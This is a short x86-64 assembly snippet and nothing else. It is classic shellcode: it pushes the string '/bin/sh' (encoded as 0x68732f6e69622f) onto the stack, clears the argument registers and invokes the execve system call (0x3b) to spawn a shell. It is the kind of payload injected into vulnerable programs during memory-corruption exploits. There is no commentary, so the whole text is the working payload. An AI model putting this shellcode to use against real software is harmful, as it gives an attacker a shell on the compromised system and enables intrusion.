mov		rbx, 0x68732f6e69622f
push	rbx
mov		rdi, rsp
xor		rsi, rsi
xor		rdx, rdx
mov		rax,0x3b
syscall
